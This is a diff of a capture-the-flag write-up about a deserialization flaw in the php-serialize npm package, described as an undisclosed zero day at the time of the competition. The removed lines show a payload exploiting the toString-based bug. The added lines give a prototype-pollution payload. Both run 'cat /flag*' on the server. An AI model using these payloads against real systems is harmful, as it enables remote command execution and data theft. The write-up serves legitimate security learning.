@@ -1,18 +1,13 @@
 
 ## Zero Day Info
 
-This challenge takes advantage of an undisclosed (at the time of the competition) zero day vulnerability on the `php-serialize` [npm package](https://www.npmjs.com/package/php-serialize). While parsing the given serialised payload, the library handles object keys as serialised objects (while in javascript they are always converted to strings), thus when added on an object, the `toString` method will be executed automatically to convert them to a string.
+This challenge takes advantage of an undisclosed (at the time of the competition) zero day vulnerability on the `php-serialize` [npm package](https://www.npmjs.com/package/php-serialize). But is also had an unintended solution using a prototype pollution.
 
 ## Exploit
 
-Generate a serilized object that when loaded will execute the toString and the command will be executed:
+Example payload from one of the first solvers (feasto), using the unintended:
 ```
-$ node ./gen_payload.js
-Serialized command: C:7:"Command":49:{{"p":{"cmd":"cat /flag* >> server.log"},"s":null}}
-Serialized object: a:1:{s:11:"exploit-key";N;}
-Exploit payload: a:1:{C:7:"Command":49:{{"p":{"cmd":"cat /flag* >> server.log"},"s":null}};N;}
-Exploit payload in base64: YToxOntDOjc6IkNvbW1hbmQiOjQ5Ont7InAiOnsiY21kIjoiY2F0IC9mbGFnKiA+PiBzZXJ2ZXIubG9nIn0sInMiOm51bGx9fTtOO30=
-Exploit was executed successfully
+O:7:"Command":2:{s:3:"sig";s:64:"5f05044907877d170b1cff58710866ed020b7bbaa71e65d1c73fe8ddaec26f77";s:6:"params";a:2:{s:4:"path";s:15:"/app/server.log";s:9:"__proto__";a:1:{s:3:"cmd";s:10:"cat /flag*";}}}
 ```
 
-For the given example exploit, the flag will be saved on the server.log file.
+(it has to be base64 encoded)
